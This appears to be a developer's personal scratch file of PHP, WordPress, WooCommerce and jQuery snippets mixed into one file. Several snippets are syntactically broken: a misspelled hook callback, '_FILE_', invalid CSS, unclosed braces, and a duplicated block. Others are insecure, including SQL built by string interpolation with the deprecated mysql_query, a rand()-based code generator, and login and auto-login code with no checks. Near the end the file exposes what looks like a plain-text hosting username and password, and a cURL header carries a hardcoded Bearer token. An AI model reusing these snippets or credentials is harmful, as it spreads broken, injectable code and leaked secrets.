<?php

pm2 for php artisan queue work
pm2 start "/usr/local/bin/php artisan queue:work --daemon --tries=3 --sleep=3 --delay=5 --timeout=60 --queue=default" --name "queue-worker" --max-memory-restart 250M

// https://dzone.com/articles/10-super-useful-php-snippets
// https://www.wpbeginner.com/wp-tutorials/25-extremely-useful-tricks-for-the-wordpress-functions-file/
// https://wordpress.stackexchange.com/questions/1567/best-collection-of-code-for-your-functions-php-file?page=1&tab=votes#tab-top
 // https://www.cloudflare.com/cdn-cgi/trace /* Get Current User IP Detail */

//     CODE SAMPLE

/* display Pre Html with hide formate in data*/

function _pre($key="",$value)
{
	echo '<pre style="display: none !important;">';
		echo "</br>";
			print_r($key); echo " ==> "; print_r($value);
		echo "</br>";
	echo '</pre>';
}

function isMobileDevice() 
{
	return preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i',$_SERVER["HTTP_USER_AGENT"])||preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i',substr($_SERVER["HTTP_USER_AGENT"],0,4)))
}

/* Hide  Error */

// define('WP_DEBUG', false);
// define('WP_DEBUG_LOG', false);
// define('WP_DEBUG_DISPLAY', false);
// define('SCRIPT_DEBUG', false);


/* display Error */

// define('WP_DEBUG', true);
// define('WP_DEBUG_LOG', true);
// define('WP_DEBUG_DISPLAY', true);
// define('SCRIPT_DEBUG', true);
// define('SAVEQUERIES', true );

/* send mail using PHP mail function */
function send_mail($to,$from,$subject,$message)
{
    $headers = 'From: '.$from. "\r\n" .
    'Reply-To: ' .$from. "\r\n" .
    'X-Mailer: PHP/' . phpversion();
    return mail($to, $subject, $message, $headers);
}



/* START ACF Option Page  */

if( function_exists('acf_add_options_page') ) {

	acf_add_options_page(array(
		'page_title' 	=> 'Mansi Caterer General Settings',
		'menu_title'	=> 'Mansi Caterer Settings',
		'menu_slug' 	=> 'theme-general-settings',
		'capability'	=> 'edit_posts',
		'redirect'		=> false
	));
	acf_add_options_page(array(
		'page_title' 	=> 'Shipping Charge',
		'menu_title'	=> 'Shipping Charge',
		'menu_slug' 	=> 'shipping-charge',
		'capability'	=> 'edit_posts',
		'redirect'		=> false
	));
}

/* END ACF Option Page  */


function get_editable_roles() {
	global $wp_roles;
	if ( ! isset( $wp_roles ) )
		$wp_roles = new WP_Roles();

	return $wp_roles->get_names();
}

function validate_mobile($mobile)
{
    return preg_match('/^[0-9]{10}+$/', $mobile);
}

function REST_is_logged_in($user_id)
{
    return get_user_meta( $user_id, 'session_tokens', true ); 
}


function generateRandomString($length = 4) {

    $characters = '0123456789';
    $charactersLength = strlen($characters);
    $randomString = '';

    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
/* Add Css in function.php,  add tag in head  */	
function hook_css() {
?>
<style>
    .wp_head_example {
	background-color : #f1f1f1;
    }
</style>
<?php
}
add_action('wp_head', 'hook_css');

/* Ajax form submission with image */

jQuery("form").submit(function(e)    {
e.preventDefault();
e.stopImmediatePropagation();
	e.stopPropagation();	


        var formdata = new FormData();
        var img = jQuery('input[name="channel_img"]')[0].files[0];
        var title = jQuery('#channel_name').val();
        var cat = jQuery('#cat').val();
        var detail = jQuery('#channel_detail').val();
        
        formdata.append("img", img);
        formdata.append("title", title);
        formdata.append("cat", cat);
        formdata.append("detail", detail);
        formdata.append("action", 'create_cst_post');
        formdata.append("type", 'wpstream_product');
        
          jQuery.ajax({
            type: 'POST',
            url: '<?=admin_url("admin-ajax.php")?>',
            traditional: true,
            processData: false,
	contentType: false,
            data:formdata,
            success: function (response)
	{
		post_id = response.post_id;
 console.log(response);
            },
            error: function (jqXHR,textStatus,errorThrown) {
                console.log(jqXHR);
                console.log(textStatus);
                console.log(errorThrown);
             
            }
        });
});

</script>
<?php

/* ajax call the below funcion  */
add_action("wp_ajax_admin_comment_on_user", "admin_comment_on_user");
add_action("wp_ajax_nopriv_admin_comment_on_user", "admin_comment_on_user");
function admin_comment_on_user(){}

 ?>

<!-- Add script in footer -->
<?php

function myscript() { ?> 
<script type="text/javascript"> 
if ( undefined !== window.jQuery ) { // script dependent on jQuery }
 </script> <?php } 
add_action( 'wp_footer', 'myscript' );
?>
/*  element view on screen event */
<script type="text/javascript"> 
jQuery(window).scroll(function() {
    var top_of_element = jQuery("#video-8186-1_html5").offset().top;
    var bottom_of_element = jQuery("#video-8186-1_html5").offset().top + jQuery("#video-8186-1_html5").outerHeight();
    var bottom_of_screen = jQuery(window).scrollTop() + jQuery(window).innerHeight();
    var top_of_screen = jQuery(window).scrollTop();

    if ((bottom_of_screen > top_of_element) && (top_of_screen < bottom_of_element)){
        jQuery('#video-8186-1_html5').trigger('play');
            var video = jQuery('#video-8186-1_html5').get(0);
            if ( video.paused ) {               jQuery('#video-8186-1_html5').trigger('play');
            } 
    } else {
       
    }
});
</script>


/*  current user role */
<?php
$user = new WP_User( get_current_user_id() );

if ( !empty( $user->roles ) && is_array( $user->roles ) ) {
    foreach ( $user->roles as $role )
        echo $role;
}
?>


	/*  remove emoji code javascript*/
const line_text = jQuery(this).val();

  resp = Array.from(line_text, x => {let theUnicode = x.charCodeAt(0).toString(16); while (theUnicode.length < 4) {theUnicode = '0' + theUnicode; } if (theUnicode < '00ff') {return x;}}).join('');


jQuery(this).val(resp);


// Sending mail with javascript code

$.ajax({
 type: "POST",
 url: "https://mandrillapp.com/api/1.0/messages/send.json",
 data: {
   'key': 'YOUR API KEY HERE',
   'message': {
     'from_email': 'YOUR@EMAIL.HERE',
     'to': [
         {
           'email': 'RECIPIENT_NO_1@EMAIL.HERE',
           'name': 'RECIPIENT NAME (OPTIONAL)',
           'type': 'to'
         },
         {
           'email': 'RECIPIENT_NO_2@EMAIL.HERE',
           'name': 'ANOTHER RECIPIENT NAME (OPTIONAL)',
           'type': 'to'
         }
       ],
     'autotext': 'true',
     'subject': 'YOUR SUBJECT HERE!',
     'html': 'YOUR EMAIL CONTENT HERE! YOU CAN USE HTML!'
   }
 }
}).done(function(response) {
  console.log(response); // if you're into that sorta thing
});
==============================================

/*************** search location by address and radious *************************/
$tableName = "db.table";
$origLat = 42.1365;
$origLon = -71.7559;
$dist = 10; // This is the maximum distance (in miles) away from $origLat, $origLon in which to search
$query = "SELECT name, latitude, longitude, 3956 * 2 * 
          ASIN(SQRT( POWER(SIN(($origLat - latitude)*pi()/180/2),2)
          +COS($origLat*pi()/180 )*COS(latitude*pi()/180)
          *POWER(SIN(($origLon-longitude)*pi()/180/2),2))) 
          as distance FROM $tableName WHERE 
          longitude between ($origLon-$dist/cos(radians($origLat))*69) 
          and ($origLon+$dist/cos(radians($origLat))*69) 
          and latitude between ($origLat-($dist/69)) 
          and ($origLat+($dist/69)) 
          having distance < $dist ORDER BY distance limit 100"; 
$result = mysql_query($query) or die(mysql_error());



/************drag and drop image then see preview **********/
http://www.inwebson.com/html5/html5-drag-and-drop-file-upload-with-canvas/


/*********** Send CSV file in correct formate link *************/
https://ziplineinteractive.com/blog/proper-php-headers-for-csv-documents-all-browsers/


/*********** End link *************/
/************** Link of scrolling content detect div is reach pr not *********/
http://jsbin.com/eyojaz/1/edit?html,js,output

/****** end link ********/

/***************** Simple Modal Popup link ************/
https://www.w3schools.com/howto/tryit.asp?filename=tryhow_css_modal

/****************** End link **********************/

/**************** for scrolling UP and DOWN ******************/


var lastScrollTop = 0;
    $(window).on('scroll', function() {
        st = $(this).scrollTop();
        if(st < lastScrollTop) {
            console.log('up 1');
        }
        else {
            console.log('down 1');
        }
        lastScrollTop = st;
    })

/************** APPLY CSS IN IFRAME ****************/

$('#id').load(function(){
$("#id").contents().find("#buddypress").css("margin-top", "-100px");
});


/********* Uploading files and images with AJAX ***********/
$('#bac-img').change(function(){
if (this.files && this.files[0] ){				    	
		        var reader = new FileReader();
		        //var p_id = jQuery("#post_ID").val();
		        reader.readAsDataURL(this.files[0]);
		    }
		    var file_data = jQuery('#bac-img').prop('files')[0];  
			var form_data = new FormData();                  
			form_data.append('bacimg', file_data); 
			$.ajax({
			url: '../wp-content/themes/Divi/custom_calender/image-upload-ajax.php', 
			dataType: 'text',  
			cache: false,
			contentType: false,
			processData: false,
			data: form_data,                         
			type: 'post',
			success: function(response){
					}	});
		      });

/**************** Woocommerce Hook link ******************/
https://gist.github.com/anderly/264754af7f8ddd942dd9

/******** ADDING EXTRA COLUMN IN WOOCOMMERCE ADMIN SITE *******/
add_filter('manage_edit-film_columns', 'my_columns');
function my_columns($columns) {
    $columns['views'] = 'Views';
    return $columns;
}
Actually, the hook manage_edit-${post_type}_columns takes an argument $columns which is an array of all registered columns. To add a new column, just add a new element to this array, like this:


/****** upload image PROGRESS BAR ******/
/*** adding this in ajax code before success ******/
xhr: function() {
          var myXhr = jQuery.ajaxSettings.xhr();
           if(myXhr.upload){
                       myXhr.upload.addEventListener('progress',progress, false);
                    }
              return myXhr;
        },
success: function(response){
	 jQuery("#progBar").hide();
}


function progress(e){
        if(e.lengthComputable){
            jQuery('progress').attr({value:e.loaded,max:e.total});
            var percentage = (e.loaded / e.total) * 100;
            jQuery('#prog').html(percentage.toFixed(0)+'%');
        }
    }
 
    function resetProgressBar() {
        jQuery('#prog').html('0%');
        jQuery('progress').attr({value:0,max:100});
    }
/**********************************End Code*************************************************/


/*************************  Changing wordpress Email header Filter *********************************/

// Change default WP email sender
add_filter('wp_mail_from', 'doEmailFilter');
add_filter('wp_mail_from_name', 'doEmailNameFilter');

function doEmailFilter($email_address){
if($email_address === "wordpress@webdevelopment11.com")
    return 'blrrid@webdevelopment11.com';
else
    return $email_address;
}
function doEmailNameFilter($email_from){
if($email_from === "WordPress")
    return 'Blrrid';
else
    return $email_from;
}



/************************* Adding wordpress media *************************/
<?php 
  wp_enqueue_script('jquery');
  // This will enqueue the Media Uploader script
  wp_enqueue_media();
?>
    <div>
    <label for="image_url">Image</label>
    <input type="text" name="image_url" id="image_url" class="regular-text">
    <input type="button" name="upload-btn" id="upload-btn" class="button-secondary" value="Upload Image">

</div>
<script type="text/javascript">
jQuery(document).ready(function($){
    $('#upload-btn').click(function(e) {
        e.preventDefault();
        var image = wp.media({ 
            title: 'Upload Image',
            // mutiple: true if you want to upload multiple files at once
            multiple: false
        }).open()
        .on('select', function(e){
            // This will return the selected image from the Media Uploader, the result is an object
            var uploaded_image = image.state().get('selection').first();
            // We convert uploaded_image to a JSON object to make accessing it easier
            // Output to the console uploaded_image
            console.log(uploaded_image);
            var image_url = uploaded_image.toJSON().url;
            // Let's assign the url value to the input field
            $('#image_url').val(image_url);
        });
    });
});
</script>
/************************* End code *************************/

/************************ Enqueue Style and Script ********************/

wp_enqueue_style( 'style-name', plugin_dir_url( _FILE_ ) . 'custom-style.css' );
wp_enqueue_script( 'script-name', plugin_dir_url( _FILE_ ) .' custom-script.js');

/************************* End code *************************/


/************* Contact form7 adding Captcha ****************/

[captchac captcha-21] [captchar captcha-31]

/************* End Shortcode ********************/

/************* Wordpress Login Code ****************/

Note : this code put before get_header();
$creds = array();
    $creds['user_login'] = $_POST['email'];
    $creds['user_password'] = $_POST['pwd'];
    $creds['remember'] = true;
    $user = wp_signon( $creds, false );
    if(isset($user->ID)){
    wp_clear_auth_cookie();
    wp_set_current_user ( $user->ID );
    wp_set_auth_cookie  ( $user->ID );
    $redirect_to = get_site_url();//user_admin_url();
    wp_safe_redirect( $redirect_to );
/************* End Shortcode ********************/

/*custom code for Custom Post display display*/
add_action( 'init', 'codex_book_init',1 );
/**
 * Register a book post type.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_post_type
 */
function codex_book_init() {
	$labels = array(
		'name'               => _x( 'Propertys', 'post type general name', 'your-plugin-textdomain' ),
		'singular_name'      => _x( 'property', 'post type singular name', 'your-plugin-textdomain' ),
		'menu_name'          => _x( 'Propertys', 'admin menu', 'your-plugin-textdomain' ),
		'name_admin_bar'     => _x( 'property', 'add new on admin bar', 'your-plugin-textdomain' ),
		'add_new'            => _x( 'Add New', 'property', 'your-plugin-textdomain' ),
		'add_new_item'       => __( 'Add New property', 'your-plugin-textdomain' ),
		'new_item'           => __( 'New Property', 'your-plugin-textdomain' ),
		'edit_item'          => __( 'Edit Property', 'your-plugin-textdomain' ),
		'view_item'          => __( 'View Property', 'your-plugin-textdomain' ),
		'all_items'          => __( 'All Propertys', 'your-plugin-textdomain' ),
		'search_items'       => __( 'Search Propertys', 'your-plugin-textdomain' ),
		'parent_item_colon'  => __( 'Parent Propertys:', 'your-plugin-textdomain' ),
		'not_found'          => __( 'No Propertys found.', 'your-plugin-textdomain' ),
		'not_found_in_trash' => __( 'No Propertys found in Trash.', 'your-plugin-textdomain' )
	);

	$args = array(
		'labels'             => $labels,
                'description'        => __( 'Description.', 'your-plugin-textdomain' ),
		'public'             => true,
		'publicly_queryable' => true,
		'show_ui'            => true,
		'show_in_menu'       => true,
		'query_var'          => true,
		'rewrite'            => array( 'slug' => 'property' ),
		'capability_type'    => 'post',
		'has_archive'        => true,
		'hierarchical'       => false,
		'menu_position'      => null,
		'supports'           => array( 'title', 'editor', 'author', 'thumbnail', 'excerpt', 'comments' )
	);

	register_post_type( 'property', $args );
}

function taxonomy_slug_rewrite($wp_rewrite) {
    $rules = array();
    // get all custom taxonomies
    $taxonomies = get_taxonomies(array('_builtin' => false), 'objects');
    // get all custom post types
    $post_types = get_post_types(array('public' => true, '_builtin' => false), 'objects');

    foreach ($post_types as $post_type) {
        foreach ($taxonomies as $taxonomy) {

            // go through all post types which this taxonomy is assigned to
            foreach ($taxonomy->object_type as $object_type) {

                // check if taxonomy is registered for this custom type
                if ($object_type == $post_type->rewrite['slug']) {
                    // get category objects
                    $terms = get_categories(array('type' => $object_type, 'taxonomy' => $taxonomy->name, 'hide_empty' => 0));

                    // make rules
                    foreach ($terms as $term) {
                        $rules[$object_type . '/' . $term->slug . '/?$'] = 'index.php?' . $term->taxonomy . '=' . $term->slug;
                    }
                }
            }
        }
    }
    // merge with global rules
    $wp_rewrite->rules = $rules + $wp_rewrite->rules;
}
add_filter('generate_rewrite_rules', 'taxonomy_slug_rewrite');

/*custom code for Custom Post display end*/


/***** htaccess rules for https *****/
RewriteCond %{SERVER_PORT} !^443$
RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]
/********** end code *******/



/******************************check div content size**********************/
<script>
$.fn.textWidth = function(text, font) {
    if (!$.fn.textWidth.fakeEl) $.fn.textWidth.fakeEl = $('<span>').hide().appendTo(document.body);
    $.fn.textWidth.fakeEl.text(text || this.val() || this.text()).css('font', font || this.css('font'));
    return $.fn.textWidth.fakeEl.width();
};
 
$('.text-preview').on('keypress', function(event) {
  if(event.keyCode==13){
   		event.preventDefault();
  }
  
  
  if($(this).textWidth() > $('.text-preview').width()-30 ){
    event.preventDefault();
  }
}).trigger('input');
</script>

/******************************end check div content size**********************/



/************************Remove menu from wp-admin panel ***************/
add_action( 'admin_menu', 'my_remove_menu_pages' );

function my_remove_menu_pages() {
  remove_menu_page( 'edit.php' );                   //Posts
  remove_menu_page( 'upload.php' );                 //Media
  remove_menu_page( 'edit-comments.php' );          //Comments
  remove_menu_page( 'themes.php' );                 //Appearance
  remove_menu_page( 'users.php' );                  //Users
  remove_menu_page( 'tools.php' );                  //Tools
  remove_menu_page( 'options-general.php' );        //Settings
  remove_menu_page( 'edit.php?post_type=acf' );
  remove_menu_page( 'wpcf7' );


};
/******************************end Remove menu from wp-admin panel**********************/

/****************************** Placeholder hide on focus ******************************/
Input:focus::placeholder{
	opacity:0;
}
/******************************End code ******************************/

/******************************Get Exact mouse position in canvas ******************************/
function getRelativeMousePosition(event, target) {
			target = target || event.target;
			var rect = target.getBoundingClientRect();

			return {
			    x: event.clientX - rect.left,
			    y: event.clientY - rect.top,
			}
		}

		// assumes target or event.target is canvas
function getNoPaddingNoBorderCanvasRelativeMousePosition(event, target) {
			target = target || event.target;
			var pos = getRelativeMousePosition(event, target);

			pos.x = pos.x * target.width  / target.clientWidth;
			pos.y = pos.y * target.height / target.clientHeight;

			return pos;  
		}
       	const pos = getNoPaddingNoBorderCanvasRelativeMousePosition(e, canvas);

  		mouse_at.x = pos.x;
  		mouse_at.y = pos.y;


/******************************End code ******************************/
/******************* Admin Ajax wordpress *************************/
var url = "<?php echo admin_url('admin-ajax.php'); ?>";

    jQuery.ajax({

           type: 'post',
           url: url,
           data: {action:'action_name',form_data:jQuery("#idForm").serialize()},
           success: function(data)           {	

           }
         });

function function_name(){

	die();

}

  add_action( 'wp_ajax_action_name', 'functon_name' );    // If called from admin panel
  add_action('wp_ajax_nopriv_action_name', 'functon_name' );

************************************get size of text*********************************************
function getWidthOfText(txt, fontname, fontsize){
		if(getWidthOfText.c === undefined){
			getWidthOfText.c=document.createElement('canvas');
			getWidthOfText.ctx=getWidthOfText.c.getContext('2d');
		}
		getWidthOfText.ctx.font = fontsize + ' ' + fontname;
		return getWidthOfText.ctx.measureText(txt).width;
	}



************************************end get size of text*********************************************




***************************************hide show menu for difrent users**************************
function wpse31748_exclude_menu_items( $items, $menu, $args ) {
    // Iterate over the items to search and destroy
    foreach ( $items as $key => $item ) {
        if ( $item->object_id == 26 && is_user_logged_in() ){
			unset( $items[$key] );
		}else if(!is_user_logged_in() && ( $item->object_id == 88 || $item->object_id == 100)){
			unset( $items[$key] );
		}else if(is_user_logged_in() &&  $item->object_id == 88 &&  get_user_meta(get_current_user_id(),'custom_role',true)=='laundry_user'){
			unset( $items[$key] );
		}else if(is_user_logged_in() &&  $item->object_id == 100 &&  get_user_meta(get_current_user_id(),'custom_role',true)=='laundry_admin'){
			unset( $items[$key] );
		}
    }

    return $items;
}

add_filter( 'wp_get_nav_menu_items', 'wpse31748_exclude_menu_items', null, 3 );
***************************************end hide show menu for difrent users**************************




********************************* Set & destroy cookie in jQuery **********************************
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.js"></script>
<script type="text/javascript">
	$("#add").click(function(){
		$.cookie('login-vault', '1');
	});
	$("#delete").click(function(){
		 var date = new Date();
         var m = 10;
		 date.setTime(date.getTime() - (m * 60 * 1000));
		 $.cookie('login-vault', '1', { expires: date });
	});
******************************** End cookie in jQuery ************************************

****************************** https tricks link ********************************************

https://www.eukhost.com/kb/3-simple-ways-to-redirect-a-website-from-http-to-https/

function redirectTohttps() {
if($_SERVER['HTTPS']!="on") {

$redirect= "https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];

header("Location:$redirect"); } }

************************************** End link *************************************

**********************************Wocommerce Zipcode function********************************

Add code in function.php file :

add_filter( 'woocommerce_default_address_fields' , 'custom_override_default_postcode_field' );
function custom_override_default_postcode_field( $address_fields ) {
    // Your postcodes array
    $postcode_array = array(
        'opt1' => "001122",
        'opt2' => "112200",
        'opt3' => "334400"
    );
    $address_fields['postcode']['type'] = 'select';
    $address_fields['postcode']['options'] = $postcode_array;

    return $address_fields;
}
*******************************end Wocommerce Zipcode function****************************



************************Start Woocommerce product Invisible code*******************************
Put in functions.php File 

//Removes links
add_filter( 'woocommerce_product_is_visible','product_invisible');
function product_invisible(){
    return false;
}

//Remove single page
add_filter( 'woocommerce_register_post_type_product','hide_product_page',12,1);
function hide_product_page($args){
    $args["publicly_queryable"]=false;
    $args["public"]=false;
    return $args;
}
************************End Woocommerce product Invisible code*********************************


************************  Css Loader  *********************************

	.class_name {
   border: 6px solid #f3f3f3;
   border-radius: 50%;
   border-top: 6px solid #3498db;
   border-bottom: 6px solid #3498db;
   width: 20px;
   height: 20px;
   -webkit-animation: spin 2s linearinfinite;
   animation: spin 2s linearinfinite;
}

********************* Time Ago **********************

function timeago($date) {
		$timestamp = strtotime($date);	
						   
		$strTime = array("second", "minute", "hour", "day", "month", "year");
		$length = array("60","60","24","30","12","10");

		$currentTime = time();
		if($currentTime >= $timestamp) {
			$diff     = time()- $timestamp;
			for($i = 0; $diff >= $length[$i] && $i < count($length)-1; $i++) {
					$diff = $diff / $length[$i];
			}

			$diff = round($diff);
			return $diff . " " . $strTime[$i] . "(s) ago ";
			}
		}

================Wordpress auto login to user ==============
 	    wp_clear_auth_cookie();
                wp_set_current_user( $user );
                wp_set_auth_cookie( $user );


=============== CURL WORKING LIKE BROWSER WORK ==============

function getUrlContent($url) {
    fopen("cookies.txt", "w");
    $parts = parse_url($url);
    $host = $parts['host'];
    $ch = curl_init();
    $header = array('GET /1575051 HTTP/1.1',
        "Host: {$host}",
        'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language:en-US,en;q=0.8',
        'Cache-Control:max-age=0',
        'Connection:keep-alive',
        'Host:adfoc.us',
        'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36',
    );

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
    curl_setopt($ch, CURLOPT_COOKIESESSION, true);

    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

$url = "http://adfoc.us/1575051";
$html = getUrlContent($url);

REFERENCE LINK: https://stackoverflow.com/questions/17363545/file-get-contents-is-not-working-for-some-url



************************************ CURL FOR API CALL *****************************************

function getUrlContent($url) {
  
    $parts = parse_url($url);
    $host = $parts['host'];
    $ch = curl_init();
    $header = array('GET /1575051 HTTP/1.1',
        "Host: {$host}",
        'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language:en-US,en;q=0.8',
        'Cache-Control:max-age=0',
        'Connection:keep-alive',
        'Authorization:Bearer 7f9318bb-4d99-4b32-8cdc-b7d8b9cf8459',
        
        'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36',
    );

    curl_setopt($ch, CURLOPT_URL, $url);
   
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
    curl_setopt($ch, CURLOPT_COOKIESESSION, true);


 
 
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}




/***** From multiple array get keys ******/

function array_keys_multi(array $array)
{
    $keys = array();
    foreach ($array as $key => $value) {
        $keys[] = $key;
        if (is_array($array[$key])) {
            $keys = array_merge($keys, array_keys_multi($array[$key]));
        }
    }
    return $keys;
}


000webhost.com
files.000webhost.com
elfish-rotor
hunani@123



=================================================

// get web page response through php function

function get_web_page($url) {
	$options = array(
	CURLOPT_RETURNTRANSFER => true,   // return web page
	CURLOPT_HEADER         => false,  // don't return headers
	CURLOPT_FOLLOWLOCATION => true,   // follow redirects
	CURLOPT_MAXREDIRS      => 10,     // stop after 10 redirects
	CURLOPT_ENCODING       => "",     // handle compressed
	CURLOPT_USERAGENT      => "test", // name of client
	CURLOPT_AUTOREFERER    => true,   // set referrer on redirect
	CURLOPT_CONNECTTIMEOUT => 120,    // time-out on connect
	CURLOPT_TIMEOUT        => 120,    // time-out on response
	); 
	
	$ch = curl_init($url);
	curl_setopt_array($ch, $options);
	
	$content  = curl_exec($ch);
	
	curl_close($ch);
	
	return $content;
}



=============================================
Related Products in woocommerce modify code for same category product show:
==============================================

add_filter("woocommerce_related_products", "show_same_cat_related_products",10,3);

function show_same_cat_related_products($related_posts,$product_id,$limit_array){
    global $woocommerce;
    
    $cats_array = array('');
    $product = wc_get_product( $product_id );
    
    $terms = wp_get_post_terms($product_id, 'School');
    foreach ( $terms as $key => $term ){
        $check_for_children = get_categories(array('parent' => $term->term_id, 'taxonomy' => 'School'));
        
        if(empty($check_for_children)){
            $cats_array[] = $term->term_id;
        }
    }
  
    if ( sizeof($cats_array)==1 ) return array();
 
    $meta_query = array();
    $meta_query[] = $woocommerce->query->visibility_meta_query();
    $meta_query[] = $woocommerce->query->stock_status_meta_query();
    $meta_query   = array_filter( $meta_query );
   
    $related_posts = get_posts( array(
            'orderby'        => 'rand',
            'posts_per_page' => 4,
            'post_type'      => 'product',
            'fields'         => 'ids',
            'meta_query'     => $meta_query,
            'tax_query'      => array(
                'relation'      => 'OR',
                array(
                    'taxonomy'     => 'School',
                    'field'        => 'id',
                    'terms'        => $cats_array
                )
            )
        ) );
        
     $related_posts = array_diff($related_posts, array( $product->id ), $product->get_upsells() );
     $limit_array['limit'] = 4;
     return $related_posts;
 }  

/*************** search location by address and radious *************************/
$tableName = "db.table";
$origLat = 42.1365;
$origLon = -71.7559;
$dist = 10; // This is the maximum distance (in miles) away from $origLat, $origLon in which to search
$query = "SELECT name, latitude, longitude, 3956 * 2 * 
          ASIN(SQRT( POWER(SIN(($origLat - latitude)*pi()/180/2),2)
          +COS($origLat*pi()/180 )*COS(latitude*pi()/180)
          *POWER(SIN(($origLon-longitude)*pi()/180/2),2))) 
          as distance FROM $tableName WHERE 
          longitude between ($origLon-$dist/cos(radians($origLat))*69) 
          and ($origLon+$dist/cos(radians($origLat))*69) 
          and latitude between ($origLat-($dist/69)) 
          and ($origLat+($dist/69)) 
          having distance < $dist ORDER BY distance limit 100"; 
$result = mysql_query($query) or die(mysql_error());



/************drag and drop image then see preview **********/
http://www.inwebson.com/html5/html5-drag-and-drop-file-upload-with-canvas/


/*********** Send CSV file in correct formate link *************/
https://ziplineinteractive.com/blog/proper-php-headers-for-csv-documents-all-browsers/


/*********** End link *************/
/************** Link of scrolling content detect div is reach pr not *********/
http://jsbin.com/eyojaz/1/edit?html,js,output

/****** end link ********/

/***************** Simple Modal Popup link ************/
https://www.w3schools.com/howto/tryit.asp?filename=tryhow_css_modal

/****************** End link **********************/

/**************** for scrolling UP and DOWN ******************/


var lastScrollTop = 0;
    $(window).on('scroll', function() {
        st = $(this).scrollTop();
        if(st < lastScrollTop) {
            console.log('up 1');
        }
        else {
            console.log('down 1');
        }
        lastScrollTop = st;
    })

/************** APPLY CSS IN IFRAME ****************/

$('#id').load(function(){
$("#id").contents().find("#buddypress").css("margin-top", "-100px");
});


/********* Uploading files and images with AJAX ***********/
$('#bac-img').change(function(){
if (this.files && this.files[0] ){				    	
		        var reader = new FileReader();
		        //var p_id = jQuery("#post_ID").val();
		        reader.readAsDataURL(this.files[0]);
		    }
		    var file_data = jQuery('#bac-img').prop('files')[0];  
			var form_data = new FormData();                  
			form_data.append('bacimg', file_data); 
			$.ajax({
			url: '../wp-content/themes/Divi/custom_calender/image-upload-ajax.php', 
